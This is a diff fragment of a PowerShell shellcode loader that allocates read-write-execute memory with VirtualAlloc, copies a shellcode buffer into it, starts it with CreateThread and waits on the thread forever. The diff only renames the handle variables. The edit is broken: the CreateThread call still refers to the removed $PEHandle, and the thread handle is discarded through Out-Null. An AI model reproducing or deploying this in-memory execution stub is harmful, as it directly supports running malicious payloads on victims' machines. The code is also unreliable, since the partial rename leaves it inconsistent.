@@ -63,14 +63,14 @@ $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForF
 $size = $shellcode.Length;
 
 # Allocate memory
-$PEHandle = [IntPtr]::Zero
-$PEHandle = $VirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40);
+$MemoryHandle = [IntPtr]::Zero
+$MemoryHandle = $VirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40);
 
 # Copy shellcode into allocated memory
-[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $PEHandle, $size) | Out-Null
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $MemoryHandle, $size) | Out-Null
 
 # Create a thread and execute the shellcode
-$RThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $PEHandle, [IntPtr]::Zero, ([UInt32]0), ([IntPtr]0)) | Out-Null
+$ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $PEHandle, [IntPtr]::Zero, ([UInt32]0), ([IntPtr]0)) | Out-Null
 
 # Make the thread run forever
-$WaitForSingleObject.Invoke(([IntPtr]$RThreadHandle), [uint32]"0xFFFFFFFF") | Out-Null
+$WaitForSingleObject.Invoke(([IntPtr]$ThreadHandle), [uint32]"0xFFFFFFFF") | Out-Null
